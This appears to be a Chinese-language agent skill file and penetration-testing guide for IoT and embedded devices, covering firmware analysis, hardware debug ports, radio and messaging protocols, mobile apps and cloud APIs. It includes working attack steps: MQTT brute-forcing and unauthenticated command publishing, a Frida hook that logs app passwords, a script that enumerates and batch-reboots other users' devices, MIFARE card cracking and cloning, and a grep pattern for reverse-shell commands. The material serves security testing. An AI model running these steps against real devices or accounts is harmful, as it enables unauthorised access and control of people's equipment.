---
name: "iot-security-testing"
description: "IoT/嵌入式安全测试：固件分析/硬件安全/通信协议/MQTT/BLE/ZigBee/车联网/ICS-SCADA/2026 Matter协议/5G IoT"
---

# IoT/嵌入式安全测试技能

## 概述

本技能覆盖 IoT/嵌入式安全测试全栈技术体系，从硬件层到云平台，从固件逆向到协议分析，涵盖 2026 年最新 IoT 攻击面与技术趋势。适用于渗透测试工程师、安全研究员、产品安全架构师等角色。

### 核心技术域索引

| 技术域 | 覆盖范围 |
|--------|----------|
| 固件分析 | 固件提取(SPI/SWD/JTAG/eMMC)/解包(binwalk/unblob)/逆向/后门发现/硬编码凭据提取 |
| 硬件安全 | UART串口调试/JTAG/SWD/SPI Flash读取/I2C嗅探/PCB逆向/芯片丝印查询 |
| 通信协议 | MQTT/CoAP/ZigBee/Wi-Fi/BLE/Z-Wave/LoRaWAN/NFC/RFID |
| 移动端与云平台 | IoT App逆向/API安全/云平台横向移动/MQTT Broker未授权 |
| 2026新攻击面 | Matter协议/Thread网络/5G IoT/边缘计算/AIoT设备 |
| 硬件工具链 | JTAGulator/BusPirate/Logic Analyzer/Shikra/Proxmark3/HackRF |
| 嵌入式系统 | ARM TrustZone/安全启动绕过/TEE攻击/固件签名绕过/UBoot漏洞 |
| 车联网 | CAN总线/OBD-II/UDS/ECU逆向/V2X通信 |
| ICS/SCADA | Modbus/DNP3/OPC UA/PLC攻击 |
| 实战工具链 | firmwalker/EMBA/FACT/OFRAK/Ghidra固件分析 |

---

## 一、固件分析 (Firmware Analysis)

### 1.1 固件获取途径

固件是 IoT 设备安全测试的起点，获取途径包括：

```
# 途径1: 厂商官网下载
# 搜索关键词: "firmware download" "GPL source" "open source" site:vendor.com

# 途径2: 设备OTA抓包
# 配置代理截获设备更新请求
mitmproxy -p 8080 --mode transparent
# 或使用 tcpdump 抓取更新流量
tcpdump -i eth0 -w ota_capture.pcap host <device-ip>

# 途径3: 从设备硬件提取（见硬件安全章节）
# 使用 SPI Flash 编程器 / JTAG / SWD 读取
```

### 1.2 固件解包与分析

#### binwalk 基础使用

```bash
# 安装 binwalk
sudo apt install binwalk

# 扫描固件文件结构
binwalk firmware.bin

# 递归提取固件中的所有文件系统
binwalk -e -M firmware.bin

# 指定提取目录
binwalk -e -M -C extracted_firmware/ firmware.bin

# 查看固件熵值（识别加密/压缩区域）
binwalk -E firmware.bin

# 使用 binwalk 签名扫描
binwalk -A firmware.bin          # 扫描常见架构操作码
binwalk -R "\x00\x00\x00\x00" firmware.bin  # 自定义魔数搜索

# 快速提取所有已知文件类型
binwalk --dd='.*' firmware.bin
```

#### unblob 高级固件解包

```bash
# 安装 unblob (2024+ 推荐，智能识别嵌套固件)
pip install unblob

# 解包固件，自动处理多层嵌套
unblob firmware.bin

# 查看提取报告
unblob --show-report firmware.bin

# 指定输出目录
unblob -e /tmp/output firmware.bin

# 批量处理多个固件
for fw in *.bin; do unblob -e "output_${fw%.*}" "$fw"; done
```

### 1.3 固件文件系统分析

```bash
# 挂载提取出的文件系统
mkdir -p /mnt/firmware
mount -o loop extracted_firmware/rootfs.ext4 /mnt/firmware

# 搜索硬编码凭据
grep -r "password" /mnt/firmware/etc/ 2>/dev/null
grep -r "PRIVATE KEY" /mnt/firmware/ 2>/dev/null
grep -r "BEGIN RSA" /mnt/firmware/ 2>/dev/null
grep -rn "api[_-]?key" /mnt/firmware/ 2>/dev/null
grep -rn "Authorization" /mnt/firmware/ 2>/dev/null

# 搜索 SSH 密钥
find /mnt/firmware -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null

# 搜索数据库文件
find /mnt/firmware -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# 搜索配置文件
find /mnt/firmware -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null

# 搜索私有证书
find /mnt/firmware -name "*.crt" -o -name "*.p12" -o -name "*.pfx" -o -name "*.jks" -o -name "*.keystore" 2>/dev/null

# 检查启动脚本中是否有后门
grep -r "telnetd\|dropbear\|/bin/sh" /mnt/firmware/etc/init.d/ 2>/dev/null
grep -r "nc -e\|bash -i\|python -c" /mnt/firmware/ 2>/dev/null
```

### 1.4 firmwalker 自动化固件分析

```bash
# 安装 firmwalker
git clone https://github.com/craigz28/firmwalker.git
cd firmwalker

# 运行 firmwalker 扫描固件目录
./firmwalker.sh /mnt/firmware

# firmwalker 会自动检查:
# - 硬编码密码/密钥
# - SSL/TLS 证书
# - 启动脚本
# - 网络配置
# - 数据库文件
# - 二进制文件信息
# - 后门检测
```

### 1.5 EMBA (Embedded Analyzer) 全自动固件分析

EMBA 是固件安全分析的工业级框架，集成超过 80 个模块。

```bash
# 安装 EMBA
git clone https://github.com/e-m-b-a/emba.git
cd emba
sudo ./installer.sh -d

# 运行完整固件分析
sudo ./emba -l ./logs -f /path/to/firmware.bin -p ./scan-profiles/default-scan-profile.emba

# 使用特定模块扫描
sudo ./emba -l ./logs -f firmware.bin -m S115

# 核心模块列表:
# P02 - 固件提取
# P05 - 固件版本检测
# S06 - 发行版识别
# S09 - 固件二进制文件搜索
# S12 - 二进制保护机制检测(NX/Stack Canary/PIE/RELRO/ASLR)
# S13 - 弱函数检测(system/strcpy/gets/sprintf)
# S14 - 缓冲区溢出 PoC 生成
# S20 - SNMP 分析
# S24 - 内核漏洞检测
# S35 - HTTP 文件分析
# S40 - 影子文件分析
# S55 - 历史文件分析
# S60 - 证书分析
# S85 - SSH 密钥分析
# S103 - 内核模块检测
# S107 - 密码哈希提取
# S108 - STACS 密码分析
# S115 - 后门检测
# S116 - 漏洞利用路径搜索
# S120 - CVE 扫描器
```

### 1.6 FACT (Firmware Analysis and Comparison Toolkit)

```bash
# FACT 提供 Web 界面和 REST API 的固件分析平台
# 安装 (Docker)
git clone https://github.com/fkie-cad/FACT_core.git
cd FACT_core
docker-compose up -d

# 通过 Web UI 上传固件: http://localhost:5000
# FACT 支持:
# - 固件解包与文件系统提取
# - 软件组件识别与 CVE 匹配
# - 二进制文件分析
# - 加密材料检测
# - 固件比较与差分分析
```

### 1.7 Ghidra 固件逆向

```bash
# 使用 Ghidra 加载固件二进制
# 1. 确定目标架构
file /mnt/firmware/bin/busybox
readelf -h /mnt/firmware/bin/busybox

# 2. 在 Ghidra 中创建新项目
#    File -> New Project -> Non-Shared Project
# 3. 导入二进制文件
#    File -> Import File -> 选择固件中的 ELF 文件
# 4. 设置正确的架构和加载地址
#    Language: 根据架构选择 (ARM:LE:32:v7 等)
# 5. 运行自动分析
#    Analysis -> Auto Analyze

# 常用 Ghidra 脚本
# 固件基址搜索脚本 (Python):
# 在 Ghidra Script Manager 中运行:
```

```python
# Ghidra Python 脚本: 搜索固件中的硬编码凭据
# find_credentials.py
from ghidra.program.model.data import StringDataType
from ghidra.util.task import ConsoleTaskMonitor

def find_strings_with_pattern(pattern_list):
    listing = currentProgram.getListing()
    data_iter = listing.getDefinedData(True)
    results = []
    while data_iter.hasNext():
        data = data_iter.next()
        if data.getDataType() == StringDataType.dataType:
            val = data.getValue()
            if val:
                for pattern in pattern_list:
                    if pattern in str(val).lower():
                        results.append((data.getAddress(), val))
    return results

patterns = ["password", "passwd", "secret", "key", "token", "api_key", "jwt"]
results = find_strings_with_pattern(patterns)
for addr, val in results:
    print("[+] {}: {}".format(addr, val))
```

### 1.8 OFRAK 固件修复与逆向框架

```bash
# OFRAK (Open Firmware Reverse Analysis Konsole)
# 安装
pip install ofrak

# 解包与可视化
ofrak unpack firmware.bin

# 图形化界面
ofrak gui firmware.bin

# OFRAK 核心能力:
# - 固件解包/打包 (支持 30+ 文件系统)
# - 二进制修补 (在线修改固件)
# - 组件识别 (ELF/PE 解析)
# - 熵值分析
# - 自定义插件扩展
```

### 1.9 固件后门发现实战

```bash
# 1. 搜索可疑的监听端口配置
grep -rn "0.0.0.0\|INADDR_ANY" /mnt/firmware/etc/ 2>/dev/null

# 2. 检查 rc.local / init.d 中的可疑启动项
cat /mnt/firmware/etc/rc.local 2>/dev/null
ls -la /mnt/firmware/etc/init.d/ 2>/dev/null

# 3. 搜索硬编码的 IP 地址
grep -rEo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' /mnt/firmware/ 2>/dev/null | sort -u

# 4. 检查 shadow 文件
cat /mnt/firmware/etc/shadow 2>/dev/null

# 5. 检查是否开启了 telnetd
grep -r "telnetd" /mnt/firmware/ 2>/dev/null

# 6. 检查 SSH 密钥
find /mnt/firmware -name "authorized_keys" 2>/dev/null
```

---

## 二、硬件安全 (Hardware Security)

### 2.1 UART 串口调试

UART 是最常见的硬件调试接口，几乎所有 IoT 设备都通过 UART 输出调试信息。

```bash
# 硬件连接步骤:
# 1. 识别 PCB 上的 UART 引脚
#    使用万用表测量电压:
#    - VCC: 通常 3.3V 或 5V
#    - GND: 与地连通
#    - TX: 电压波动 (发送数据时)
#    - RX: 电压稳定 (空闲时)
#
# 2. 使用 USB-TTL 转换器 (如 CP2102/FT232/CH340)
#    连接: GND-GND, TX-RX, RX-TX (交叉连接)
#    注意: 不要接 VCC
#
# 3. 确定波特率 (常见: 115200, 57600, 9600, 38400)
#    使用逻辑分析仪或波特率扫描工具

# 使用 minicom 连接 UART
sudo minicom -D /dev/ttyUSB0 -b 115200

# 使用 screen 连接
sudo screen /dev/ttyUSB0 115200

# 使用 picocom 连接
sudo picocom -b 115200 /dev/ttyUSB0

# 使用 Python 自动波特率扫描
python3 << 'EOF'
import serial
import time
baud_rates = [9600, 14400, 19200, 38400, 57600, 115200, 230400, 460800, 921600]
for br in baud_rates:
    try:
        ser = serial.Serial('/dev/ttyUSB0', br, timeout=1)
        time.sleep(0.5)
        data = ser.read(ser.in_waiting or 100)
        if data:
            print(f"[+] Baud rate {br}: {data[:50]}")
        ser.close()
    except:
        pass
EOF
```

### 2.2 JTAG 调试接口

JTAG (Joint Test Action Group) 接口提供对芯片的底层调试能力，可以读取内存、设置断点、单步执行。

```bash
# JTAG 引脚识别
# 标准 JTAG 引脚: TDI, TDO, TMS, TCK, TRST (可选), GND
# 使用 JTAGulator 自动识别引脚排列

# 使用 OpenOCD 连接 JTAG
openocd -f interface/ftdi/jtagulator.cfg -f target/stm32f1x.cfg

# 使用 telnet 连接 OpenOCD 控制台
telnet localhost 4444

# OpenOCD 命令:
# > halt                          # 暂停 CPU
# > reg                           # 查看寄存器
# > mdw 0x08000000 64             # 读取内存 (32-bit)
# > dump_image flash.bin 0x08000000 0x100000  # 导出 Flash 内容
# > resume                        # 恢复运行
```

### 2.3 SWD 调试接口

SWD (Serial Wire Debug) 是 ARM Cortex-M 系列常用的双线调试接口。

```bash
# SWD 引脚: SWDIO, SWCLK, GND, (VCC 可选)
# 使用 ST-Link / J-Link / Black Magic Probe

# OpenOCD 连接 SWD
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg

# 使用 pyOCD 连接 SWD
pyocd commander -t stm32f103c8

# pyOCD 命令:
# > readmem 0x08000000 0x1000     # 读取 Flash
# > savemem 0x08000000 0x10000 flash_dump.bin  # 导出 Flash
# > writemem 0x20000000 0xDEADBEEF  # 写入内存
# > reset                         # 复位
```

### 2.4 SPI Flash 读取

```bash
# 使用 FlashROM 工具读取 SPI Flash
# 先通过 SOIC8 测试夹或直接焊接连接

# 检测芯片
flashrom -p linux_spi:dev=/dev/spidev0.0

# 读取芯片内容
flashrom -p linux_spi:dev=/dev/spidev0.0 -r flash_dump.bin

# 使用 8-pin SOIC 夹子 + CH341A 编程器
flashrom -p ch341a_spi -r flash_dump.bin

# 验证读取内容
md5sum flash_dump.bin
```

### 2.5 I2C 嗅探与分析

```bash
# I2C 嗅探连接
# 使用逻辑分析仪 (如 Saleae Logic) 或 Bus Pirate

# Bus Pirate 连接:
# 1. 连接 SDA, SCL, GND
# 2. 进入 I2C 模式
screen /dev/ttyUSB0 115200
# > m            # 模式选择
# > 4            # I2C
# > 3            # 100kHz
# > W            # 开启电源

# I2C 地址扫描
# > (1)          # 扫描 7-bit 地址
# 输出: 0x50 0x68 等

# 读取 EEPROM (常见地址 0x50)
# > [0xA0 0x00 0x00 [0xA1 r:256]  # 读取 256 字节

# 使用 Python I2C 嗅探
python3 << 'EOF'
import smbus
bus = smbus.SMBus(1)
# 扫描 I2C 总线
for addr in range(0x03, 0x78):
    try:
        bus.read_byte(addr)
        print(f"[+] Device found at 0x{addr:02X}")
    except:
        pass
EOF
```

### 2.6 PCB 逆向与芯片丝印查询

```bash
# PCB 逆向步骤:
# 1. 拍摄高分辨率 PCB 正反面照片
# 2. 使用 KiCad/Altium 绘制原理图
# 3. 识别关键芯片:
#    - 主控 MCU/SoC
#    - Flash 存储芯片 (SPI NOR Flash/NAND)
#    - RAM 芯片
#    - 无线模块 (WiFi/BLE/ZigBee)
#    - 传感器

# 芯片丝印查询网站:
# - https://smd.yooneed.one/
# - https://chip.tomsk.ru/
# - https://www.s-manuals.com/smd
# - Google 图片搜索: "SMD marking [丝印代码]"

# 使用 Grep 搜索芯片手册
grep -r "marking" /path/to/datasheet/ 2>/dev/null
```

### 2.7 电压故障注入 (Voltage Glitching)

```bash
# 使用 ChipWhisperer 进行电压故障注入
# 绕过安全启动、读取保护

# 安装 ChipWhisperer
pip install chipwhisperer

# 基本故障注入脚本
python3 << 'EOF'
import chipwhisperer as cw
scope = cw.scope()
target = cw.target(scope)
# 配置 glitch 参数
scope.glitch.ext_offset = 10
scope.glitch.repeat = 5
scope.glitch.clk_src = "clkgen"
# 执行 glitch
scope.glitch.manual_trigger()
EOF
```

---

## 三、通信协议分析 (Communication Protocol Analysis)

### 3.1 MQTT 协议安全

MQTT 是 IoT 设备最广泛使用的消息协议，常见安全问题包括未授权访问、明文传输、Topic 泄露。

```bash
# MQTT Broker 发现
nmap -p 1883,8883,8083,8443,9001 --script mqtt-subscribe 192.168.1.0/24

# MQTT 匿名连接测试
mosquitto_sub -h <broker-ip> -p 1883 -t "#" -v

# 订阅所有 Topic
mosquitto_sub -h <broker-ip> -t "#" -v -d

# 发布恶意消息
mosquitto_pub -h <broker-ip> -t "device/control/relay" -m '{"state":"ON"}'

# MQTT 暴力破解
hydra -L users.txt -P passwords.txt mqtt://<broker-ip>

# 使用 Python 进行 MQTT 安全测试
```

```python
# mqtt_security_test.py
import paho.mqtt.client as mqtt
import ssl

def on_connect(client, userdata, flags, rc):
    print(f"[+] Connected with result code {rc}")
    # 订阅所有 topic
    client.subscribe("#")

def on_message(client, userdata, msg):
    print(f"[TOPIC] {msg.topic} -> {msg.payload}")

# 测试匿名连接
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

try:
    client.connect("192.168.1.100", 1883, 60)
    client.loop_forever()
except Exception as e:
    print(f"[-] Connection failed: {e}")

# 测试 TLS 连接
client_tls = mqtt.Client()
client_tls.tls_set(ca_certs=None, certfile=None, keyfile=None,
                    cert_reqs=ssl.CERT_NONE)
client_tls.connect("192.168.1.100", 8883)
```

### 3.2 CoAP 协议安全

CoAP (Constrained Application Protocol) 是 IoT 设备轻量级 REST 协议，基于 UDP。

```bash
# CoAP 设备发现
nmap -p 5683,5684 -sU --script coap-resource-directory 192.168.1.0/24

# 使用 coap-client 交互
# 安装: apt install libcoap2-bin

# 发现资源
coap-client -m get "coap://192.168.1.100/.well-known/core"

# 读取资源
coap-client -m get "coap://192.168.1.100/sensor/temperature"

# PUT 写入
coap-client -m put -e "new_value" "coap://192.168.1.100/config/setting"

# 使用 Python aiocoap
```

```python
# coap_security_test.py
import asyncio
from aiocoap import *

async def coap_discover():
    protocol = await Context.create_client_context()
    request = Message(code=GET, uri='coap://192.168.1.100/.well-known/core')
    response = await protocol.request(request).response
    print(f"[+] Resources: {response.payload.decode()}")

async def coap_enum():
    # 常见资源路径枚举
    paths = ['sensor', 'config', 'admin', 'debug', 'firmware', 'reboot']
    protocol = await Context.create_client_context()
    for path in paths:
        request = Message(code=GET, uri=f'coap://192.168.1.100/{path}')
        try:
            response = await asyncio.wait_for(
                protocol.request(request).response, timeout=2)
            print(f"[+] {path}: {response.payload.decode()[:100]}")
        except:
            pass

asyncio.run(coap_discover())
```

### 3.3 BLE 蓝牙安全

```bash
# BLE 扫描与发现
sudo hcitool lescan --duplicates

# 使用 bettercap 进行 BLE 侦察
sudo bettercap -eval "ble.recon on"

# 使用 gatttool 与 BLE 设备交互
gatttool -b <MAC> -I
# > connect
# > primary
# > characteristics
# > char-read-hnd 0x0025
# > char-write-req 0x0026 0100

# BLE 嗅探
# 使用 Ubertooth One / nRF52840 Dongle / Adafruit Bluefruit LE Sniffer

# 使用 bleah 枚举 BLE 设备
sudo bleah
# blegateway 扫描
sudo hciconfig hci0 down
sudo hciconfig hci0 up
```

```python
# ble_security_test.py
from bluepy.btle import Scanner, DefaultDelegate, Peripheral

class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)
    def handleDiscovery(self, dev, isNewDev, isNewData):
        if isNewDev:
            print(f"[+] Device: {dev.addr} ({dev.addrType})")
            for (adtype, desc, value) in dev.getScanData():
                print(f"    {desc}: {value}")

# 扫描设备
scanner = Scanner().withDelegate(ScanDelegate())
devices = scanner.scan(10.0)

# 连接设备并读取 GATT
for dev in devices:
    print(f"\n[Device] {dev.addr}")
    try:
        p = Peripheral(dev)
        services = p.getServices()
        for svc in services:
            print(f"  Service: {svc.uuid}")
            for ch in svc.getCharacteristics():
                print(f"    Char: {ch.uuid} | Handle: {ch.getHandle()}")
                if ch.supportsRead():
                    try:
                        print(f"      Value: {ch.read()}")
                    except:
                        pass
        p.disconnect()
    except Exception as e:
        print(f"  Error: {e}")
```

### 3.4 ZigBee 安全

```bash
# ZigBee 嗅探与攻击
# 硬件: CC2531 USB Dongle + Zigbee2MQTT 固件

# 使用 KillerBee 框架
# 安装
git clone https://github.com/riverloopsec/killerbee.git
cd killerbee
sudo python3 setup.py install

# 扫描 ZigBee 网络
zbstumbler -w /dev/ttyUSB0

# 捕获 ZigBee 流量
zbdump -w /dev/ttyUSB0 -c 11 -f zigbee_capture.pcap

# ZigBee 密钥提取
# 如果设备使用默认 Trust Center Link Key:
# 5A 69 67 42 65 65 41 6C 6C 69 61 6E 63 65 30 39
# (ZigBeeAlliance09)

# 使用 ZigDiggity / Attify ZigBee Framework
```

### 3.5 LoRaWAN 安全

```bash
# LoRaWAN 嗅探
# 硬件: RTL-SDR / HackRF One / LoStik

# 使用 gr-lora 解码 LoRa 信号
# 安装 GNU Radio + gr-lora
git clone https://github.com/rpp0/gr-lora.git
cd gr-lora
mkdir build && cd build
cmake .. && make && sudo make install

# LoRaWAN 帧分析
# 使用 chirpstack 相关工具

# 针对 LoRaWAN 的攻击:
# - ABP 设备密钥提取
# - 重放攻击
# - Join Request/Join Accept 分析
# - 默认 AppKey 暴力破解
```

### 3.6 NFC/RFID 安全

```bash
# 使用 Proxmark3 进行 NFC/RFID 安全测试
# Proxmark3 安装
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
make clean && make -j4

# 连接 Proxmark3
./pm3

# Proxmark3 命令:
# > hf search                     # 搜索高频卡
# > lf search                     # 搜索低频卡
# > hf mf rdbl 0 A FFFFFFFFFFFF   # 读取 MIFARE Classic 扇区 0
# > hf mf nested 1 0 A FFFFFFFFFFFF  # Nested 攻击获取密钥
# > hf mf hardnested               # 硬嵌套攻击
# > hf mf darkside                 # Darkside 攻击
# > hf mf chk                      # 密钥验证
# > hf mf dump                     # 导出卡片数据
# > hf mf restore                  # 恢复/克隆卡片

# 使用 mfoc 破解 MIFARE Classic
mfoc -O dump.mfd
```

---

## 四、移动端与云平台 (Mobile & Cloud)

### 4.1 IoT 手机 App 逆向

```bash
# APK 逆向 (Android)
# 反编译 APK
apktool d iot_app.apk -o apk_extracted

# 使用 jadx 反编译
jadx-gui iot_app.apk

# 搜索 MQTT/BLE 凭据
grep -r "mqtt" apk_extracted/
grep -r "password\|secret\|api_key\|token" apk_extracted/smali/ 2>/dev/null
grep -r "broker\|host\|port" apk_extracted/ 2>/dev/null

# 提取 native 库分析
unzip iot_app.apk -d apk_unzip/
find apk_unzip/ -name "*.so" -exec file {} \;

# iOS IPA 逆向
# 使用 Hopper Disassembler / IDA Pro
# 使用 Frida 进行动态分析
```

```bash
# Frida 动态 Hook IoT App
# 启动 Frida Server
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# Hook MQTT 连接
frida -U -l mqtt_hook.js com.iot.app
```

```javascript
// mqtt_hook.js - Hook MQTT 连接参数
Java.perform(function() {
    var MqttClient = Java.use("org.eclipse.paho.client.mqttv3.MqttClient");
    MqttClient.connect.overload().implementation = function() {
        console.log("[+] MQTT connect called");
        console.log("    Server URI: " + this.getServerURI());
        return this.connect();
    };

    MqttClient.connect.overload('org.eclipse.paho.client.mqttv3.MqttConnectOptions')
        .implementation = function(options) {
        console.log("[+] MQTT connect with options");
        console.log("    Server URI: " + this.getServerURI());
        var userName = options.getUserName();
        var password = options.getPassword();
        if (userName) console.log("    Username: " + userName);
        if (password) console.log("    Password: " + new String(password));
        return this.connect(options);
    };
});
```

### 4.2 IoT 云平台 API 安全测试

```bash
# 抓取 IoT App 与云平台的 API 通信
# 设置 Burp Suite 代理
adb shell settings put global http_proxy <proxy-ip>:8080

# 或使用 mitmproxy
mitmproxy -p 8080 --mode transparent

# 分析 API 端点:
# - 用户认证与授权
# - 设备绑定/解绑 API
# - 设备控制 API
# - 固件更新 API
# - 数据同步 API
```

```python
# iot_api_test.py - IoT 云平台 API 安全测试
import requests
import json

BASE_URL = "https://api.iot-vendor.com/v1"

# 1. 测试设备绑定 API 是否存在 IDOR
def test_device_idor(token):
    headers = {"Authorization": f"Bearer {token}"}
    for device_id in range(1, 1000):
        r = requests.get(f"{BASE_URL}/devices/{device_id}", headers=headers)
        if r.status_code == 200:
            print(f"[+] Accessible device: {device_id} -> {r.json()}")

# 2. 测试 MQTT 凭据获取 API
def test_mqtt_credentials(token):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/devices/credentials", headers=headers)
    print(f"[+] MQTT Credentials: {r.json()}")

# 3. 测试固件更新 API 签名绕过
def test_firmware_update(token, firmware_url):
    headers = {"Authorization": f"Bearer {token}"}
    data = {"url": firmware_url, "version": "999.0.0"}
    r = requests.post(f"{BASE_URL}/firmware/update", headers=headers, json=data)
    print(f"[+] Firmware update: {r.status_code} -> {r.text}")

# 4. 测试批量设备控制 API
def test_batch_control(token):
    headers = {"Authorization": f"Bearer {token}"}
    devices = list(range(1000, 1100))  # 尝试控制其他设备
    data = {"device_ids": devices, "command": "reboot"}
    r = requests.post(f"{BASE_URL}/devices/batch", headers=headers, json=data)
    print(f"[+] Batch control: {r.status_code} -> {r.text}")
```

### 4.3 MQTT Broker 未授权访问

```bash
# 大规模 MQTT Broker 扫描
shodan search "port:1883 MQTT"
zoomeye search "service:mqtt"

# 使用 mosquitto_sub 测试匿名访问
mosquitto_sub -h <target-ip> -t "#" -v -d 2>&1 | head -50

# MQTT Broker 信息收集
mosquitto_sub -h <target-ip> -t '$SYS/#' -v

# 暴力破解 MQTT 认证
nmap -p 1883 --script mqtt-subscribe --script-args mqtt-subscribe.topic='#' <target>
```

---

## 五、2026 最新 IoT 攻击面

### 5.1 Matter 协议安全

Matter 是 CSA (Connectivity Standards Alliance) 推出的智能家居统一协议，2025-2026 年大规模商用。

```bash
# Matter 协议分析工具
# 使用 chip-tool (Matter 官方工具)
git clone https://github.com/project-chip/connectedhomeip.git
cd connectedhomeip
source scripts/activate.sh

# Matter 设备发现
chip-tool pairing ble-wifi <node-id> <ssid> <password> <pin> <discriminator>

# 威胁面分析:
# - DAC (Device Attestation Certificate) 验证绕过
# - PASE (Password Authenticated Session Establishment) 暴力破解
# - CASE (Certificate Authenticated Session Establishment) 证书伪造
# - 多管理员 (Multi-Admin) 权限滥用
# - Fabric 间隔离绕过
# - OTA 更新劫持
```

```python
# matter_security_test.py - Matter 协议安全测试
# Matter 使用 UDP 5540 端口进行 mDNS 发现
# Matter 使用 TCP 5540 端口进行安全通信

import socket
import struct

def matter_discovery():
    """扫描局域网中的 Matter 设备"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    # mDNS 查询 Matter 服务
    query = b'\x00\x00\x84\x00\x00\x00\x00\x01\x00\x00\x00\x00' + \
            b'\x0d_matter\x04_tcp\x05local\x00\x00\x0c\x00\x01'
    sock.sendto(query, ('224.0.0.251', 5353))
    sock.settimeout(3)
    try:
        data, addr = sock.recvfrom(1024)
        print(f"[+] Matter device found: {addr}")
    except:
        pass

# Matter DAC 验证绕过检测
def check_dac_validation(device_ip):
    """检查设备 DAC 证书验证是否严格"""
    # 使用自签名证书尝试连接
    pass
```

### 5.2 Thread 网络攻击

Thread 是基于 6LoWPAN 的低功耗网状网络协议，是 Matter 的主要底层传输。

```bash
# Thread 网络嗅探
# 需要 Thread 嗅探器硬件 (nRF52840 Dongle 刷 Thread 固件)

# 使用 Wireshark 分析 Thread 流量
# 解码器: IEEE 802.15.4 -> 6LoWPAN -> IPv6 -> UDP/CoAP

# Thread 攻击面:
# - 网络密钥 (Master Key) 提取
# - Commissioner 欺骗 (加入网络)
# - Border Router 攻击
# - 6LoWPAN 分片攻击
# - Mesh 路由投毒
```

### 5.3 5G IoT 安全

```bash
# 5G IoT 特有攻击面:
# - 5G NR (New Radio) 信号分析
# - 网络切片 (Network Slicing) 隔离绕过
# - eSIM 远程配置攻击 (GSMA SGP.22)
# - NEF (Network Exposure Function) API 滥用
# - mMTC (massive Machine Type Communications) 设备群攻击

# 5G 信号分析工具
# - srsRAN (开源 5G RAN)
# - Open5GS (开源 5G Core)
# - UERANSIM (UE/RAN 模拟器)

# 部署测试 5G 核心网
git clone https://github.com/open5gs/open5gs.git
cd open5gs
meson build --prefix=/usr
ninja -C build
sudo ninja -C build install
```

### 5.4 边缘计算安全

```bash
# 边缘计算攻击面:
# - 边缘节点容器逃逸
# - 边缘 AI 模型投毒/窃取
# - 边缘-云通信劫持
# - 边缘设备本地存储数据窃取
# - K3s/MicroK8s 集群攻击

# 边缘 AI 模型攻击
# 模型提取攻击
python3 << 'EOF'
import torch
# 通过大量 API 查询重建边缘 AI 模型
# 使用 Model Inversion / Model Extraction 技术
EOF
```

### 5.5 AIoT 设备攻击

AIoT (AI + IoT) 是 2026 年新兴攻击面：

```bash
# AIoT 攻击面:
# - AI 芯片调试接口 (NPU/TPU JTAG)
# - 设备端 AI 模型逆向
# - 传感器数据投毒 (对抗样本)
# - 语音助手注入攻击 (超声波/激光)
# - 视觉 AI 对抗攻击 (物理对抗补丁)
# - 联邦学习中毒攻击

# 对抗样本生成 (目标: IoT 视觉传感器)
python3 << 'EOF'
import torch
import torchvision.models as models
# 使用 FGSM/PGD 生成对抗样本
# 针对 IoT 设备上部署的轻量级模型 (MobileNet/EfficientNet)
EOF
```

---

## 六、硬件攻击工具链 (Hardware Attack Toolchain)

### 6.1 JTAGulator

JTAGulator 是自动识别 JTAG/SWD 引脚排列的硬件工具。

```bash
# JTAGulator 连接
screen /dev/ttyUSB0 115200

# 进入 JTAG 扫描模式
# > J
# 设置扫描参数
# > 设置通道数, 超时时间等

# JTAGulator 将自动:
# 1. 扫描所有引脚组合
# 2. 识别 TDI, TDO, TMS, TCK, TRST
# 3. 输出引脚映射表
```

### 6.2 Bus Pirate

Bus Pirate 是多协议硬件调试工具，支持 I2C, SPI, UART, 1-Wire, JTAG 等。

```bash
# Bus Pirate 基本操作
screen /dev/ttyUSB0 115200

# 模式选择
# m -> 1 (UART) / 3 (I2C) / 4 (SPI) / 5 (1-Wire) / 6 (JTAG)

# SPI Flash 读取示例
# m -> 4 (SPI)
# 1 -> 100kHz
# W -> 开启电源
# [0x03 0x00 0x00 0x00 r:256]  # 读取 256 字节

# UART 嗅探
# m -> 1 (UART)
# 3 -> 115200
# (1)  # 桥接模式
```

### 6.3 Logic Analyzer (逻辑分析仪)

```bash
# Saleae Logic / DSLogic 等逻辑分析仪
# 使用 sigrok/PulseView 开源软件

# 安装 sigrok
sudo apt install sigrok pulseview

# 使用 PulseView 图形界面分析
pulseview

# 使用 sigrok-cli 命令行
sigrok-cli -d fx2lafw --config samplerate=1MHz --samples=1M -o capture.sr

# 协议解码:
# - UART/RS232
# - I2C
# - SPI
# - JTAG
# - 1-Wire
# - CAN
# - PS/2
# - USB
```

### 6.4 Shikra

Shikra 是 Xipiter 开发的硬件安全测试工具，集成 JTAG/SWD/UART/SPI/I2C/GPIO。

```bash
# Shikra 连接
screen /dev/ttyACM0 115200

# 使用 Shikra 进行 SWD 调试
# 支持 ARM Cortex-M 系列芯片
```

### 6.5 Proxmark3

Proxmark3 是 RFID/NFC 安全研究的标准工具。

```bash
# Proxmark3 基本命令
./pm3

# 高频卡 (13.56 MHz) 操作
hf search                          # 搜索卡片
hf 14a info                        # 读取 ISO14443-A 卡片信息
hf mf autopwn                      # 自动破解 MIFARE Classic
hf mf dump -f dump.mfd             # 导出卡片
hf mf restore -f dump.mfd          # 恢复卡片

# 低频卡 (125 kHz) 操作
lf search                          # 搜索卡片
lf hid read                        # 读取 HID 卡
lf em 410x read                    # 读取 EM410x 卡

# 模拟卡片
hf mf sim -u <uid>                 # 模拟 MIFARE UID
lf hid sim -r <facility> -c <card> # 模拟 HID 卡
```

### 6.6 HackRF One

HackRF One 是软件定义无线电 (SDR) 平台，支持 1 MHz - 6 GHz。

```bash
# HackRF 基本使用
# 频谱扫描
hackrf_sweep -f 2400:2480 -w 100000 -l 32 -g 40

# 信号录制
